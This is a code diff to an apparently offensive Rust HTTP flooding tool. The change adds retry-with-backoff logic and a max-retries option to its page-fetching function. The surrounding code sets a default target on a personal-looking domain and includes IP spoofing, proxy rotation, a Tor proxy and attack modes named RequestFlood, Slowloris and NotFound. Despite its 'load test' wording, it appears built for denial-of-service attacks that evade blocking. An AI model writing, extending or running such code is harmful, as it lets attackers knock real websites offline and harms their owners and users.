@@ -38,6 +38,46 @@ async fn clone_request_builder_with_retry(
     ))))
 }
 
+async fn send_with_retry(
+    builder: RequestBuilder,
+    max_retries: usize,
+    name: &str,
+) -> Result<reqwest::Response, FetchError> {
+    let mut last_err: Option<FetchError> = None;
+    for attempt in 0..=max_retries {
+        let cloned = clone_request_builder_with_retry(&builder, name).await?;
+        match cloned.send().await {
+            Ok(resp) => {
+                let status = resp.status();
+                if status.is_server_error() && attempt < max_retries {
+                    last_err = Some(FetchError::from(std::io::Error::other(format!(
+                        "{name}: server error {status}"
+                    ))));
+                    let backoff = Duration::from_millis(500 * (1u64 << attempt)).min(Duration::from_secs(8));
+                    tokio::time::sleep(backoff).await;
+                    continue;
+                }
+                return Ok(resp);
+            }
+            Err(e) => {
+                if (e.is_timeout() || e.is_connect()) && attempt < max_retries {
+                    last_err = Some(FetchError::from(e));
+                    let backoff = Duration::from_millis(500 * (1u64 << attempt)).min(Duration::from_secs(8));
+                    tokio::time::sleep(backoff).await;
+                    continue;
+                }
+                return Err(FetchError::from(e));
+            }
+        }
+    }
+    Err(match last_err {
+        Some(err) => err,
+        None => FetchError::from(std::io::Error::other(format!(
+            "{name}: all retries exhausted"
+        ))),
+    })
+}
+
 const DEFAULT_TARGET_URL: &str = "https://livdevries.com";
 
 static SPOOF_IP: AtomicBool = AtomicBool::new(false);
@@ -200,6 +240,7 @@ fn print_help() {
     println!("  --json                Output results as JSON");
     println!("  --rate N              Rate limit: max N requests per second");
     println!("  --max-redirects N     Max HTTP redirects to follow (default: 10)");
+    println!("  --max-retries N       Max per-request retries for transient failures (default: 3)");
     println!("  --rotation-strategy   Proxy rotation: weighted|round-robin|random (default: weighted)");
     println!("  --log-file F          Append status updates to file");
     println!("  --canary              Run a canary health check before load test");
@@ -783,36 +824,17 @@ fn parse_templates(body: &str) -> String {
     result
 }
 
-async fn fetch_page(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool) -> Result<(usize, u16), FetchError> {
+async fn fetch_page(c: Client, url: String, delay: u64, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>, verbose: bool, max_retries: usize) -> Result<(usize, u16), FetchError> {
     if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
     if verbose {
         println!("[VERBOSE] fetch_page: GET {}", url);
     }
     let builder = add_session_cookie(browser_request(c.get(&url), false), proxy_idx, &sessions);
-    let mut last_err = None;
-    for attempt in 0..=2 {
-        match clone_request_builder_with_retry(&builder, "fetch_page").await {
-            Ok(cloned) => match cloned.send().await {
-                Ok(resp) => {
-                    let status = resp.status().as_u16();
-                    update_session_from_headers(proxy_idx, &sessions, resp.headers());
-                    let bytes = resp.bytes().await?.len();
-                    return Ok((bytes, status));
-                }
-                Err(e) => {
-                    if attempt < 2 {
-                        tokio::time::sleep(Duration::from_millis(500 * (1u64 << attempt))).await;
-                    }
-                    last_err = Some(e);
-                }
-            }
-            Err(e) => return Err(e),
-        }
-    }
-    match last_err {
-        Some(e) => Err(FetchError::from(e)),
-        None => Err(fetch_error_all_attempts_exhausted("fetch_page")),
-    }
+    let resp = send_with_retry(builder, max_retries, "fetch_page").await?;
+    let status = resp.status().as_u16();
+    update_session_from_headers(proxy_idx, &sessions, resp.headers());
+    let bytes = resp.bytes().await?.len();
+    Ok((bytes, status))
 }
 
 async fn fetch_page_with_referrer(
@@ -1193,6 +1215,7 @@ struct AppState {
     custom_selector: Option<String>,
     tor_proxy: Option<String>,
     verbose: bool,
+    max_retries: usize,
 }
 
 impl AppState {
@@ -1215,6 +1238,7 @@ impl AppState {
         custom_selector: None,
         tor_proxy: None,
         verbose: false,
+        max_retries: 3,
     }}
 }
 
@@ -1664,9 +1688,9 @@ async fn get_proxies(mode: ProxyMode, state: &Arc<Mutex<AppState>>) -> Option<Ve
 }
 
 async fn run_load(state: Arc<Mutex<AppState>>, pool: Arc<std::sync::Mutex<ProxyPool>>, stats: Stats, delay_ms: u64, max_errors: Option<u64>) {
-    let (mut conc, interval, attack, sessions, _, apis, _statics, rate_limit, verbose) = {
+    let (mut conc, interval, attack, sessions, _, apis, _statics, rate_limit, verbose, max_retries) = {
         let st = state.lock().await;
-        (st.load_concurrency, st.interval_ms, st.attack_mode, st.sessions.clone(), st.jitter_ms, st.apis.clone(), st.statics.clone(), st.rate_limit, st.verbose)
+        (st.load_concurrency, st.interval_ms, st.attack_mode, st.sessions.clone(), st.jitter_ms, st.apis.clone(), st.statics.clone(), st.rate_limit, st.verbose, st.max_retries)
     };
     let mut jitter_ms;
     let mut semaphore = Arc::new(Semaphore::new(conc));
@@ -1785,7 +1809,7 @@ async fn run_load(state: Arc<Mutex<AppState>>, pool: Arc<std::sync::Mutex<ProxyP
                             fetch_slow(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose).await
                         }
                         AttackMode::ImageOpt => {
-                            if assets.is_empty() { fetch_page(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose).await }
+                            if assets.is_empty() { fetch_page(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await }
                             else { fetch_range(client, assets[idx1].clone(), req_delay, idx, sessions_clone.clone(), verbose).await }
                         }
                         AttackMode::LargePost => {
@@ -1802,19 +1826,19 @@ async fn run_load(state: Arc<Mutex<AppState>>, pool: Arc<std::sync::Mutex<ProxyP
                             fetch_cookie(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose).await
                         }
                         AttackMode::Ssr => {
-                            if assets.is_empty() { fetch_page(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose).await }
-                            else { fetch_page(client, assets[idx1].clone(), req_delay, idx, sessions_clone.clone(), verbose).await }
+                            if assets.is_empty() { fetch_page(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await }
+                            else { fetch_page(client, assets[idx1].clone(), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await }
                         }
                         AttackMode::Middleware => {
-                            if assets.is_empty() { fetch_page(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose).await }
-                            else { fetch_page(client, assets[idx1].clone(), req_delay, idx, sessions_clone.clone(), verbose).await }
+                            if assets.is_empty() { fetch_page(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await }
+                            else { fetch_page(client, assets[idx1].clone(), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await }
                         }
                         AttackMode::RequestFlood => {
-                            fetch_page(client, target.clone(), 0, idx, sessions_clone.clone(), verbose).await
+                            fetch_page(client, target.clone(), 0, idx, sessions_clone.clone(), verbose, max_retries).await
                         }
                         AttackMode::NotFound => {
                             let path = format!("/nonexistent-{:08x}", rand::random::<u32>());
-                            fetch_page(client, format!("{}{}", target.trim_end_matches('/'), path), req_delay, idx, sessions_clone.clone(), verbose).await
+                            fetch_page(client, format!("{}{}", target.trim_end_matches('/'), path), req_delay, idx, sessions_clone.clone(), verbose, max_retries).await
                         }
                         AttackMode::Slowloris => {
                             fetch_slowloris(client, target.clone(), req_delay, idx, sessions_clone.clone(), verbose).await
